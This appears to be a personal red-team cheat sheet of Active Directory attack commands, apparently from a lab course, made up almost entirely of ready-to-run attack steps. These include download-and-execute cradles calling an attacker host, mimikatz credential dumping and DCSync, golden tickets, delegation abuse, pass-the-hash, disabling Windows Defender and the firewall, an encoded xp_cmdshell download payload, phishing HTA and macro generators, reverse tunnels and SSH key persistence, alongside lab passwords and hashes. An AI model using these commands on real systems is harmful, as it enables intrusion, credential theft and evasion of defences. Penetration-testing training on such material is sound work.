# red
red team tips and trix

ad enum
```
iex(new-object net.webclient).downloadstring('http://192.168.10.11/view.txt')
iex(new-object net.webclient).downloadstring('http://192.168.10.11/hound.txt')
iex(new-object net.webclient).downloadstring('http://192.168.10.11/jaws.txt')
iex(new-object net.webclient).downloadstring('http://192.168.10.11/up.txt')
iex(new-object net.webclient).downloadstring('http://192.168.10.11/sql.txt')
```
```
invoke-mapdomaintrust | select sourcename,targetname,trustdirection
```
abuse force change password
```
$username = 'adminWebSvc'
$password = 'FGjksdff89sdfj' | ConvertTo-SecureString -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential -ArgumentList $username,$password
```
```
$UserPassword = ConvertTo-SecureString 'P@ssw0rd' -AsPlainText -Force
Set-DomainUserPassword -Identity nina -AccountPassword $UserPassword -Credential $cred -Verbose
```
abuse genericwrite - rbcd (Note: best way: RDP into source computer, enter SYSTEM context)
```
iex(new-object net.webclient).downloadstring('http://192.168.10.11/view.txt')
iex(new-object net.webclient).downloadstring('http://192.168.10.11/mad.txt')
iwr -uri http://192.168.10.11/oRubeus.exe -outfile c:\windows\tasks\or.exe
```
```
New-MachineAccount -MachineAccount myComputer -Password $(ConvertTo-SecureString 'h4x' -AsPlainText -Force)
Get-DomainComputer -Identity myComputer
```
```
$sid =Get-DomainComputer -Identity myComputer -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
$SDbytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDbytes,0)
```
```
Get-DomainComputer -Identity JUMP09 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```
```
$RBCDbytes = Get-DomainComputer JUMP09 -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RBCDbytes, 0
$Descriptor.DiscretionaryAcl
```
```
convertfrom-sid S-1-5-21-2032401531-514583578-4118054891-6101
OPS\myComputer$
```
```
c:\windows\tasks\or.exe hash /password:h4x
AA6EAFB522589934A6E5CE92C6438221
```
```
c:\windows\tasks\or.exe s4u /user:myComputer$ /rc4:AA6EAFB522589934A6E5CE92C6438221 /impersonateuser:administrator /msdsspn:cifs/jump09.ops.corpy.com /ptt
```
```
iwr -uri http://192.168.10.11/psexec.exe -outfile c:\windows\tasks\psexec.exe
```
```
dir \\jump09.ops.corpy.com\C$
```
```
c:\windows\tasks\psexec.exe -accepteula \\jump09.ops.corpy.com cmd
```
abuse services
```
sc qc SNMPTRAP
sc config SNMPTRAP start= demand
sc config SNMPTRAP obj= "NT Authority\SYSTEM" password= ""
sc config SNMPTRAP binpath= "cmd.exe /c net user jack P@ssw0rd /add"
```
```
sc start snmptrap
```
```
sc config SNMPTRAP binpath= "cmd.exe /c net localgroup administrators jack /add"
```
```
sc start snmptrap
```
```
net localgroup administrators
```
abuse writedacl
```
iex(new-object net.webclient).downloadstring('http://192.168.10.11/view.txt')
```
```
$SecPassword = ConvertTo-SecureString '4dfgdfFFF542' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TRICKY\sqlsvc', $SecPassword)
```
```
Add-DomainObjectAcl -PrincipalIdentity sqlsvc -TargetIdentity "MAILADMINS" -Rights All -Credential $Cred -Verbose
```
```
Add-DomainGroupMember -Identity 'MAILADMINS' -Members 'willy' -Credential $Cred -Verbose
```
```
get-domainuser willy
Get-DomainGroupMember -Identity 'MAILADMINS'
```
chisel socks (win)
```
/opt/chisel/chisel server -p 8000 --reverse
```
```
bitsadmin /Transfer myJob http://192.168.10.11/chisel.exe c:\windows\tasks\chisel.exe
c:\windows\tasks\chisel.exe client 192.168.10.11:8000 R:8001:socks
```
```
vi chi.conf
strict chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 8001
```
```
proxychains -q -f chi.conf impacket-psexec TRICKY/sqlsvc:'4dfgdfFFF542'@sql07.corpy.com 
```
chisel socks (lin)
```
/opt/chisel/chisel server -p 8000 --reverse
```
```
wget http://192.168.10.11/chisel -O /tmp/chisel
chmod 777 /tmp/chisel
/tmp/chisel client 192.168.10.11:8000 R:8001:socks
```
```
vi web05.conf
strict chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 8001
```
```
export KRB5CCNAME=/home/kali/ccc5/krb5cc.pat
```
```
proxychains -q -f web05.conf impacket-psexec corpy.com/pat@dmzdc01.corpy.com -k -no-pass
```
constrained delegation
```
get-domaincomputer -trustedtoauth
```
```
* Username : WEB01$
         * Domain   : EVIL
         * NTLM     : 004686491797c2704948c687eb203845
```
```
# if no hash and only have plaintext password
c:\tools\Rubeus.exe hash /password:lab
```
```
iwr -uri http://192.168.10.11/oRubeus.exe -outfile c:\windows\tasks\or.exe
```
```
c:\windows\tasks\or.exe asktgt /user:web01$ /domain:evil.com /rc4:004686491797c2704948c687eb203845
```
```
c:\windows\tasks\or.exe s4u /impersonateuser:administrator /msdsspn:cifs/file01.evil.com /ptt /ticket:<tix>
```
cme spray hash (local auth)
```
proxychains -q -f web05.conf crackmapexec smb ips.txt -u administrator -H 8388d07604009d14cbb78f7d37b9e887 --local-auth
```
cme spray pwd
```
proxychains -q -f met.conf crackmapexec smb ips.txt -u 'willy' -p 'fdsfssdfDFG4'
```
enable rdp
```
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
```
enum mssql
```
exec sp_linkedservers;
select name from sys.servers;
select * from sys.linked_logins;
```
escape constrained language -> rs + runspace
```
sudo rlwrap nc -lvnp 3389
```
```
python3 makers.py -l 192.168.10.11 -p 3389
```
```
python3 makerunspace.py -a 64 -l 192.168.10.11 -p 443 -t ps1 -d 1 -c 'iex(new-object net.webclient).downloadstring("http://192.168.10.11/rs.txt")'
```
extra sids - krbtgt way (ref lab 16)
```
iwr -uri http://192.168.10.11/mimikatz.exe -outfile c:\windows\tasks\m.exe
iwr -uri http://192.168.10.11/oRubeus.exe -outfile c:\windows\tasks\or.exe
iwr -uri http://192.168.10.11/psexec.exe -outfile c:\windows\tasks\psexec.exe
```
```
c:\windows\tasks\psexec.exe -accepteula -i -u "NT AUTHORITY\SYSTEM" cmd
```
```
c:\windows\tasks\m.exe "privilege::debug"
```
```
kerberos::golden /user:h4x /domain:CURRENT_DOMAIN /sid:CURRENT_DOMAIN_SID /krbtgt:KRBTGT_HASH /sids:TARGET_DOMAIN_SID-519 /ptt
```
```
dir \\rdc02.corpy.com\c$
```
gobuster
```
gobuster dir -u http://web01.evil.com/ -w /usr/share/wordlists/dirb/big.txt -b 403,404 -t 50 -k -x .htm,.html,.log,.sh,.shtml,.sql,.txt,.xml | tee gobuster.txt
```
golden tickets (note: start from being NT Authority/SYSTEM)
```
c:\windows\tasks\m.exe "kerberos::purge" "exit"
```
```
c:\windows\tasks\m.exe "privilege::debug"
```
```
kerberos::golden /user:fakeuser /domain:TARGET_DOMAIN /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /ptt
```
impacket-psexec - kerberos
```
export KRB5CCNAME=/home/kali/ccc5/krb5cc.pat
```
```
proxychains -q -f ssh.conf impacket-psexec corpy.com/pat@dmzdc01.corpy.com -k -no-pass
```
impacket-psexec - pth
```
proxychains -q -f met.conf impacket-psexec administrator@sql05.corpy.com -hashes aad3b435b51404eeaad3b435b51404ee:2060951907129392809244825245de08
```
impacket-psexec - pwd
```
proxychains -q -f chi.conf impacket-psexec TRICKY/sqlsvc:'4dfgdfFFF542'@sql07.corpy.com 
```
killdef
```
start-process powershell.exe -argumentlist "while(1){& 'C:\Program Files\Windows Defender\MpCmdRun.exe' -RemoveDefinitions -All;start-sleep -seconds 300}" -windowstyle hidden
```
killfw
```
netsh advfirewall set allprofiles state off
```
laps alternative (if laps.txt isn't working) (switch domain if have to)
```
iex(new-object net.webclient).downloadstring('http://192.168.10.11/view.txt')
```
```
Get-DomainComputer | Foreach-Object {$_ | Select name,ms-mcs-admpwd}
```
linux qol
```
python -c "import pty;pty.spawn('/bin/bash')"
```
```
python3 -c "import pty;pty.spawn('/bin/bash')"
```
makehta + makers + makerunspace + swaks
```
python3 makers.py -l 192.168.10.11 -p 443
```
```
python3 makerunspace.py -a 64 -l 192.168.10.11 -p 443 -t ps1 -d 1 -c 'iex(new-object net.webclient).downloadstring("http://192.168.10.11/rs.txt")'
```
```
python3 makehta.py -a 64 -l 192.168.10.11 -p 443 -t cmd -c 'bitsadmin /Transfer Hatealfredchar http://192.168.10.11/file.txt c:\windows\tasks\Kansaslackdad.txt'
```
```
swaks --to willy@corpy.com --from fake@corpy.com --server mail01.corpy.com --port 25 --body @body.txt
```
```
python3 makehta.py -a 64 -l 192.168.10.11 -p 443 -t cmd -c 'cmd /c certutil -decode c:\windows\tasks\Kansaslackdad.txt c:\windows\tasks\Plasticsthicknessscale.exe && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U c:\windows\tasks\Plasticsthicknessscale.exe'
```
```
swaks --to willy@corpy.com --from fake@corpy.com --server mail01.corpy.com --port 25 --body @body.txt
```
makemacro
```
python3 makemacro.py -a 64 -l 192.168.10.11 -p 443 -f inject -t doc -d ps1 -r 1
```
makerunspace inject
```
python3 makerunspace.py -a 64 -l 192.168.10.11 -p 443 -b Inject
```
makewrap -> use -p 1433 to avoid clashing with basic.rc (-p 443)
```
python3 makewrap.py -a 64 -l 192.168.10.11 -p 1433
```
met socks
```
background
use multi/manage/autoroute
set session 3
run
use auxiliary/server/socks_proxy
set srvhost 127.0.0.1
run -j
```
```
vi met.conf
strict chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 1080
```
mimi dump
```
iwr -uri http://192.168.10.11/mimidrv.sys -outfile c:\windows\tasks\mimidrv.sys
iwr -uri http://192.168.10.11/mimikatz.exe -outfile c:\windows\tasks\m.exe
```
```
c:\windows\tasks\m.exe "privilege::debug" "token::elevate" "!+" "!processprotect /process:lsass.exe /remove" "lsadump::secrets" "exit"
c:\windows\tasks\m.exe "privilege::debug" "token::elevate" "!+" "!processprotect /process:lsass.exe /remove" "sekurlsa::logonpasswords" "exit"
```
mimi pth
```
c:\windows\tasks\m.exe "privilege::debug" 
```
```
sekurlsa::pth /user:pat /domain:corpy.com /ntlm:61c6e14f88cd70638f901ea51796a194 /run:"cmd" 
```
```
sekurlsa::pth /user:administrator /domain:web06 /ntlm:f99529e42ee77dc4704c568ba9320a34 /run:"mstsc.exe /restrictedadmin"
```
mssqlclient
```
proxychains -q -f met.conf impacket-mssqlclient willy:'fdsfssdfDFG4'@sql05.corpy.com -windows-auth
```
mssql.exe shortcut
```
iwr -uri http://192.168.10.11/MSSQL.exe -outfile c:\windows\tasks\Parishcopsomewhat.exe
cmd /c c:\windows\tasks\Parishcopsomewhat.exe
```
nmap hybrid + automate
```
for i in $(cat ips.txt);do proxychains -q -f web05.conf nmap -Pn -v -p 22,3306,8080,8081,5985,443,80,1433,53,445,25,143,110,993,3389,995,139,587,135 -sCV -oN scans/nmap-tcpscans_$i.txt $i;done
```
nmap linux
```
nmap -Pn -v -p 22,443,80,8080,8081,8082,8888,3306,53,25,143,110,993,587 -sCV -oN scans/nmap-tcpscans_192.168.80.164.txt 192.168.80.164
```
nmap windows
```
nmap -Pn -v -p 5985,443,80,1433,53,445,25,143,110,993,3389,995,139,587,135 -sCV -oN scans/nmap-tcpscans_192.168.80.169.txt 192.168.80.169
```
ntlmrelay (sql)
```
sudo service smbd stop;sudo service nmbd stop
sudo service smbd start;sudo service nmbd start
```
```
proxychains -q -f met.conf impacket-ntlmrelayx --no-http-server -smb2support -t TARGET_SERVER
```
```
# current sql
xp_dirtree '\\192.168.10.11\a';
```
powershell cred
```
$username = 'username'
$password = 'password' | ConvertTo-SecureString -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential -ArgumentList $username,$password
```
printspoofer
```
python3 makerunspace.py -a 64 -l 192.168.10.11 -p 443 -b PipePipe
```
```
iwr -uri http://192.168.10.11/Runspace.exe -outfile c:\windows\tasks\Compromisewisdomwide.exe
iwr -uri http://192.168.10.11/oSpoolSample.exe -outfile c:\windows\tasks\ss.exe
```
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U c:\windows\tasks\Compromisewisdomwide.exe
```
```
^Z
background
run -j
sessions -i 1
shell
```
```
c:\windows\tasks\ss.exe db02 db02/pipe/test
```
```
^Z
channel -i 1
```
psexec.exe
```
iwr -uri http://192.168.10.11/psexec.exe -outfile c:\windows\tasks\psexec.exe
```
```
c:\windows\tasks\psexec.exe -accepteula \\jump09.ops.corpy.com cmd
```
```
c:\windows\tasks\psexec.exe -accepteula -i -u "NT Authority\SYSTEM" cmd
```
rdp restrictedadmin / rdp pth
```
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0
```
```
proxychains -q -f web05.conf xfreerdp /u:administrator /pth:289136c329f3e42331048a0465b2290a /v:dmzdc01.corpy.com /cert-ignore
```
```
iwr -uri http://192.168.10.11/mimikatz.exe -outfile c:\windows\tasks\m.exe
```
```
c:\windows\tasks\m.exe "privilege::debug" 
```
```
sekurlsa::pth /user:pat /domain:corpy.com /ntlm:61c6e14f88cd70638f901ea51796a194 /run:"cmd" 
```
```
sekurlsa::pth /user:administrator /domain:file06 /ntlm:8821c97bc6b3d2aed6e30a9540f208f3 /run:"mstsc.exe /restrictedadmin"
```
runspace shortcut (powershell)
```
iwr -uri http://192.168.10.11/Runspace.exe -outfile c:\windows\tasks\Tbsegabilly.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U c:\windows\tasks\Tbsegabilly.exe

```
runspace shortcut (cmd)
```
bitsadmin /Transfer myJob http://192.168.10.11/Runspace.exe c:\windows\tasks\Tbsegabilly.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U c:\windows\tasks\Tbsegabilly.exe
```
sql enum
```
exec sp_linkedservers;
select name from sys.servers;
select * from sys.linked_logins;
```
```
select * from sys.server_principals where principal_id like 267;
```
```
Get-SQLInstanceDomain | Get-SQLConnectionTest
Get-SQLServerLinkCrawl -Instance “sql03.final.com,1433” -query “select * from master..syslogins” | ft
```
sql exec
```
EXECUTE AS LOGIN = 'sa';
EXEC sp_serveroption 'SQL03', 'rpc out', 'true';
EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT SQL03;
EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT SQL03;
EXEC ('xp_cmdshell ''powershell -enc JAB3AGMAIAA9ACAAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAcwB5AHMAdABlAG0ALgBuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkAOwAkAHcAYwAuAGgAZQBhAGQAZQByAHMALgBhAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAAxADAALgAwADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwApADsAaQBlAHgAKAAkAHcAYwAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANAA5AC4ANwA5AC8AcgB1AG4ALgB0AHgAdAAnACkAKQA=''') AT SQL03;
```
ssh authorized_keys
```
echo "c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCZ1FESnNwNHNlTktrZXRwaE40Y0pEdTg2aEJycDBWeXZibjhxSHhRWnprc3F2SWlJU1lYZDRxaW90b1padHRMTGlTSS9GWVFxT2xUUDBIeDFaUWNyZ0J3RmZObnB1dGJpK0lEb0RKeXo5QkxtSDE3WGhvYnF6Wk95bkREY1gzb2ZDeDY2a1YwZk5nSzhKTy91ZGhLNjZvc3pXaDdWUHgrOWJFajl6V1JjM3dvRUt4aDc2NVF2QTN6aVJQZ2NLRzFPWHBReVRRZE5oNVI0MVpCRkR2RDM3MFhSL3dMd0pYWnY4K3BEbjZidzFIQ3JNb00yNENJdFVlUmpvSVJhN25mTkluM2dzampRZ2NudC8wYlBYWE44c0lhamdNL1Fsb3ViaWlTclBna2xPNmJNS2RrRHpYTGlJdTNUYmNwNTVQbHVlNm15K0hOdWthYjdOa1U0akw5SjhobXZzZnBlcW9BMzJZdlUrTUhVQ0FmRFNkbHdtRFJscVFmS0kvcXh0cCtLMFFzSjNEK1ZDUHpNcGtlV2xHd1I3OW55WDNiQUZESVhtd1YyaEtldDJ5dWIxanMxMFYwTU5nSi9nMk1OTms5WVJrQ3NRcXptQ3VNajN6TG9Qa1krTmFMZjd4cUdJSTZSYW1zUnNTL01kNzF3T3ZGNjlpN2JhVklycTN4VTQxeVQ1bWM9IGthbGlAa2FsaQo=" | base64 -d >> authorized_keys
```
```
ssh -i ~/.ssh/id_rsa 'pat@corpy.com'@192.168.106.164
```
unconstrained delegation (notes: always use meterpreter to run rubeus and capture tix!!)
```
Get-DomainComputer -Unconstrained
```
```
iwr -uri http://192.168.10.11/oRubeus.exe -outfile c:\windows\tasks\or.exe
iwr -uri http://192.168.10.11/oSpoolSample.exe -outfile c:\windows\tasks\ss.exe
iwr -uri http://192.168.10.11/mimikatz.exe -outfile c:\windows\tasks\m.exe
```
```
# this part on meterpreter!!
c:\windows\tasks\or.exe monitor /interval:5 /filteruser:CDC01$
```
```
# this part ideally with RDP!! (or rs.txt)
c:\windows\tasks\ss.exe CDC01 APPSRV01
```
```
c:\windows\tasks\or.exe ptt /ticket:THETIX
```
```
c:\windows\tasks\m.exe "privilege::debug" "lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt" "exit"
c:\windows\tasks\m.exe "privilege::debug" "lsadump::dcsync /domain:prod.corp1.com /user:prod\administrator" "exit"
```
wrap
```
wget http://192.168.49.80/wrap.txt -O /tmp/Fluzaspecialties.txt;chmod 777 /tmp/Fluzaspecialties.txt;/tmp/Fluzaspecialties.txt
```
xfreerdp pth
```
proxychains -q -f ssh.conf xfreerdp /u:administrator /pth:289136c329f3e42331048a0465b2290a /v:dmzdc01.corpy.com /cert-ignore
```
xfreerdp pwd
```
proxychains -q -f web05.conf xfreerdp /u:administrator /d:dmzdc01.corpy.com /p:fgds90345SDfsw32 /v:dmzdc01.corpy.com /cert-ignore
```
